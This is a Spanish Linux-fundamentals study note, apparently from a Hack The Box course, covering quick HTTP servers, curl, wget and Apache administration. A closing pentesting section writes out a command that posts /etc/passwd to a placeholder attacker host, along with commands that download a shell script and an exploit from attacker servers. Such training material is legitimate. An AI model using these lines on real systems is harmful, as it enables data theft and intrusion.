@@ -1,0 +1,256 @@
+---
+title: "Working with Web Services - Linux Fundamentals"
+author: "statick88"
+date: 2026-02-20
+categories: [linux, htb, security]
+format:
+  html:
+    toc: true
+    toc-depth: 3
+---
+
+## Objetivo
+
+Dominar el uso de servidores web en Linux: desde servidores simples de desarrollo hasta Apache, y herramientas de cliente HTTP como curl y wget.
+
+## Introducción
+
+Los servidores web son fundamentales tanto para desarrollo como para pruebas de penetración. Saber levantar servidores rápidamente y hacer peticiones HTTP desde la terminal son habilidades esenciales.
+
+## Escenario
+
+Necesitas:
+1. Levantar un servidor HTTP rápidamente para pruebas
+2. Transferir archivos entre sistemas
+3. Analizar respuestas HTTP
+
+## Ejercicios Prácticos
+
+### Ejercicio 1: Servidor HTTP con npm
+
+**Pregunta:** Start a simple HTTP server using npm on port 8080.
+
+```bash
+# Instalar globalmente
+npm install -g http-server
+
+# Iniciar servidor
+http-server -p 8080
+```
+
+**Respuesta:** `http-server -p 8080`
+
+### Ejercicio 2: Servidor PHP Built-in
+
+**Pregunta:** Start a PHP web server on localhost:8080.
+
+```bash
+php -S 127.0.0.1:8080
+```
+
+**Respuesta:** `php -S 127.0.0.1:8080`
+
+## Servidores HTTP Simples
+
+### Python
+```bash
+# Servidor básico
+python3 -m http.server 8080
+
+# Directorio específico
+python3 -m http.server 8080 --directory /ruta
+```
+
+### PHP
+```bash
+# Servidor con soporte PHP
+php -S localhost:8000
+
+# Con router
+php -S localhost:8000 router.php
+```
+
+### npm
+```bash
+# Sin instalación
+npx http-server -p 8080
+
+# Con instalación
+npm install -g http-server
+http-server -p 8080
+
+# Con CORS
+http-server -p 8080 --cors
+```
+
+## Herramientas de Cliente HTTP
+
+### curl - Transferir Datos
+
+```bash
+# GET request
+curl http://localhost
+
+# Solo headers
+curl -I http://localhost
+
+# POST con datos
+curl -X POST -d "key=value" http://localhost/api
+
+# POST con JSON
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"key":"value"}' http://localhost/api
+
+# Descargar archivo
+curl -O http://localhost/archivo.txt
+
+# Subir archivo
+curl -X POST -F "file=@archivo.txt" http://localhost/upload
+
+# Autenticación básica
+curl -u user:pass http://localhost
+
+# Seguir redirecciones
+curl -L http://localhost
+```
+
+### wget - Descargar Archivos
+
+```bash
+# Descargar archivo
+wget http://localhost/archivo.txt
+
+# Con nombre específico
+wget -O miarchivo.txt http://localhost/archivo.txt
+
+# Continuar descarga interrumpida
+wget -c http://localhost/archivo.grande
+
+# Descargar recursivamente (mirror)
+wget -r http://localhost
+
+# Limitar profundidad
+wget -r -l 2 http://localhost
+
+# Background
+wget -b http://localhost/archivo.grande
+```
+
+## Apache Web Server
+
+### Instalación y Gestión
+```bash
+# Instalar
+sudo apt install apache2 -y
+
+# Gestión
+sudo systemctl start apache2
+sudo systemctl stop apache2
+sudo systemctl restart apache2
+sudo systemctl status apache2
+
+# Verificar configuración
+sudo apache2ctl configtest
+```
+
+### Configuración de Puertos
+```bash
+# Editar puertos
+sudo nano /etc/apache2/ports.conf
+
+# Cambiar:
+# Listen 80
+# Por:
+# Listen 8080
+
+# Reiniciar
+sudo systemctl restart apache2
+```
+
+### Sitios Virtuales
+```bash
+# Crear nuevo sitio
+sudo nano /etc/apache2/sites-available/misitio.conf
+
+# Habilitar
+sudo a2ensite misitio.conf
+
+# Deshabilitar default
+sudo a2dissite 000-default.conf
+
+# Recargar
+sudo systemctl reload apache2
+```
+
+### Módulos
+```bash
+# Listar módulos
+apache2ctl -M
+
+# Habilitar módulo
+sudo a2enmod rewrite
+sudo a2enmod ssl
+
+# Deshabilitar
+sudo a2dismod status
+
+# Recargar
+sudo systemctl restart apache2
+```
+
+## curl vs wget
+
+| Aspecto | curl | wget |
+|---------|------|------|
+| Output | STDOUT | Guarda archivo |
+| Upload | ✓ | ✗ |
+| Resume | ✗ | ✓ |
+| Protocolos | HTTP, FTP, SCP, SFTP... | HTTP, HTTPS, FTP |
+| Uso típico | Testing, APIs | Descargas |
+
+## Casos de Uso en Pentesting
+
+### Exfiltración de Datos
+```bash
+# En target: enviar datos a nuestro servidor
+curl -X POST -d @/etc/passwd http://atacante.com/recibir
+```
+
+### Descargar Herramientas
+```bash
+# Descargar script
+wget http://atacante.com/tools/shell.sh
+chmod +x shell.sh
+```
+
+### Levantar Servidor para Recepción
+```bash
+# En nuestra máquina
+python3 -m http.server 8080
+
+# En target, descargar
+wget http://ip_atacante:8080/exploit.py
+```
+
+## ¿Qué Aprendimos?
+
+1. **npm http-server:** Servidor estático rápido con `-p`
+2. **PHP built-in:** Ideal para desarrollo con `php -S`
+3. **curl:** Versátil para peticiones HTTP
+4. **wget:** Perfecto para descargas
+5. **Python:** El más simple para servir archivos
+
+## Autoevaluación
+
+1. ¿Cuál es la diferencia entre curl y wget?
+2. ¿Cómo inicias un servidor PHP en el puerto 3000?
+3. ¿Qué hace `curl -I`?
+4. ¿Cómo cambias el puerto de Apache?
+5. ¿Qué módulo de Apache necesitas para HTTPS?
+
+## Referencias
+
+- [http-server (npm)](https://www.npmjs.com/package/http-server)
+- [PHP Built-in Web Server](https://www.php.net/manual/en/features.commandline.webserver.php)
+- [curl(1)](https://man7.org/linux/man-pages/man1/curl.1.html)
+- [wget(1)](https://man7.org/linux/man-pages/man1/wget.1.html)
